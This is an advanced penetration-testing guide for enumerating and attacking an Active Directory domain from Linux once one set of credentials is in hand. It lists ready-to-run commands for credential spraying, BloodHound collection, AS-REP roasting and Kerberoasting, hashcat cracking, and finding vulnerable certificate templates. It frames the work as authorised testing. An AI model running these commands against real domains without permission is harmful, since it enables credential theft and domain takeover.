# Active Directory enumeration

> From valid domain credentials to a map of users, groups and attack paths toward Domain Admin.

- Level: Advanced
- Time: ~30 minutes
- Tags: active directory, windows, kerberos, enumeration
- Page: https://terminal.rokibulroni.com/guide/active-directory-enumeration
- Updated: 2026-11-06

You have one set of valid domain credentials — perhaps from password spraying or a captured hash — and a route to a domain controller. This guide enumerates the domain and finds attack paths, all with tools that run from Linux. For authorised engagements only, against domains you are permitted to test.

## Prerequisites

- Valid domain credentials (password or NT hash)
- Network access to a domain controller
- impacket, NetExec and BloodHound installed

## 1. Validate the credentials

Confirm the credentials work and see what they can reach across SMB before anything else.

Tool: [CrackMapExec / NetExec](https://terminal.rokibulroni.com/api/v1/tools/lateral/crackmapexec.md)

```bash
netexec smb 10.10.10.0/24 -u svc -p Password123
```

Spray the credential across the subnet and list hosts, signing and shares.

```bash
netexec smb 10.10.10.1 -u svc -p Password123 --users
```

Enumerate domain users from the DC.

## 2. Enumerate the directory

Pull users, groups, computers and policy from LDAP. The password policy tells you how aggressively you can spray.

Tool: [ldapsearch](https://terminal.rokibulroni.com/api/v1/tools/enumeration/ldapsearch.md)

```bash
netexec ldap 10.10.10.1 -u svc -p Password123 --kdcHost 10.10.10.1 --bloodhound --collection All
```

Enumerate and collect BloodHound data in one step.

## 3. Collect attack paths with BloodHound

Ingest the domain into BloodHound to see the shortest paths from your foothold to high-value targets.

Tool: [BloodHound.py](https://terminal.rokibulroni.com/api/v1/tools/active-directory/bloodhound-python.md)

```bash
bloodhound-python -u svc -p Password123 -d corp.local -ns 10.10.10.1 -c All --zip
```

Collect objects, ACLs and sessions into a zip for import.

## 4. Roast Kerberos

AS-REP and Kerberoasting turn ordinary accounts into crackable hashes with no special privileges.

Tool: [Impacket](https://terminal.rokibulroni.com/api/v1/tools/active-directory/impacket.md)

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1
```

AS-REP roast accounts without pre-auth.

```bash
GetUserSPNs.py corp.local/svc:Password123 -dc-ip 10.10.10.1 -request
```

Kerberoast service accounts.

## 5. Crack what you collected

Feed the roasted hashes to hashcat offline. Cracked service accounts are often a step up in privilege.

Tool: [Hashcat](https://terminal.rokibulroni.com/api/v1/tools/credentials/hashcat.md)

```bash
hashcat -m 13100 kerb.txt rockyou.txt
```

Crack TGS-REP (Kerberoast) hashes.

```bash
hashcat -m 18200 asrep.txt rockyou.txt
```

Crack AS-REP hashes.

## 6. Check certificate services

AD CS misconfigurations (ESC1 and friends) are a common and reliable path to Domain Admin.

Tool: [Certipy](https://terminal.rokibulroni.com/api/v1/tools/active-directory/certipy.md)

```bash
certipy find -u svc@corp.local -p Password123 -dc-ip 10.10.10.1 -vulnerable -stdout
```

Flag vulnerable certificate templates.

## Wrap-up

BloodHound usually makes the next move obvious: a group membership, an ACL, or a delegation that leads upward. Validate each edge before acting on it, and keep careful notes — AD paths can be long, and defenders are watching these exact protocols.
